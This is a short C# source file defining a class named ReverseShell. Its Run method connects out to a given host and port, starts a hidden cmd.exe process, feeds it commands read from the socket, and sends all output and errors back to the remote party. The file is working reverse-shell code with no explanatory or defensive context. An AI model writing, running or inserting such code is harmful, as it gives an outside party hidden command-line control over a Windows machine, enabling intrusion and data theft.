namespace ReverseShell
{
    class ReverseShell
    {
        static System.IO.StreamWriter streamWriter;

        public static void Run(string host, int port)
        {
            System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient();
            client.SendTimeout = 50000000;
            client.ReceiveTimeout = 50000000;
            client.Connect(host, port);
            System.IO.Stream stream = client.GetStream();
            System.IO.StreamReader streamReader = new System.IO.StreamReader(stream);
            streamWriter = new System.IO.StreamWriter(stream);

            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(OnOutputDataReceived);
            p.ErrorDataReceived += new System.Diagnostics.DataReceivedEventHandler(OnErrorDataReceived);
            p.Start();
            p.BeginOutputReadLine();
            p.BeginErrorReadLine();

            while (true)
            {
                p.StandardInput.WriteLine(streamReader.ReadLine());
            }
        }

        private static void OnOutputDataReceived(object sender, System.Diagnostics.DataReceivedEventArgs args)
        {
            if (!string.IsNullOrEmpty(args.Data))
            {
                try
                {
                    streamWriter.WriteLine(args.Data);
                    streamWriter.Flush();
                } 
                catch (System.Exception)
                {

                }
            }
        }

        private static void OnErrorDataReceived(object sender, System.Diagnostics.DataReceivedEventArgs args)
        {
            if (!string.IsNullOrEmpty(args.Data))
            {
                try
                {
                    streamWriter.WriteLine(args.Data);
                    streamWriter.Flush();
                }
                catch (System.Exception)
                {

                }
            }
        }
    }
}
